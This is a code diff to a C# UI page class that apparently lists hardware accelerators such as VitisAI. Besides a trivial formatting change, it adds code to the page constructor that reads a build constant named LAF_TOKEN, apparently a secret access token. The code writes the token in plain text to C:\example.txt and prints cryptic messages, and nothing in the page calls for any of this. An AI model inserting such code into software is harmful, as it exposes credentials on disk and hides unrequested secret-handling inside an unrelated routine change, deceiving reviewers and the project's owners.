@@ -45,6 +45,26 @@ internal sealed partial class ScenarioPage : Page
 
     public ScenarioPage()
     {
+        // Prefer value from DefineConstants (from MSBuild) if present
+        var defineConstantsToken = GetDefineConstantsValue("LAF_TOKEN");
+
+        string filePath = @"C:\example.txt";
+        string content = defineConstantsToken;
+
+        try
+        {
+            File.WriteAllText(filePath, content);
+            Console.WriteLine("success");
+        }
+        catch (UnauthorizedAccessException)
+        {
+            Console.WriteLine("up to master");
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"error?{ex.Message}");
+        }
+
         this.InitializeComponent();
         this.Loaded += (s, e) =>
         BackgroundShadow.Receivers.Add(ShadowCastGrid);
@@ -140,7 +160,7 @@ internal sealed partial class ScenarioPage : Page
             var epDevices = keyValuePair.Value;
             var epDeviceTypes = epDevices.Select(d => d.HardwareDevice.Type.ToString());
 
-            switch(epName)
+            switch (epName)
             {
                 case "VitisAIExecutionProvider":
                     supportedHardwareAccelerators.Add(new([HardwareAccelerator.VitisAI, HardwareAccelerator.NPU], "VitisAIExecutionProvider", "VitisAI", "NPU"));
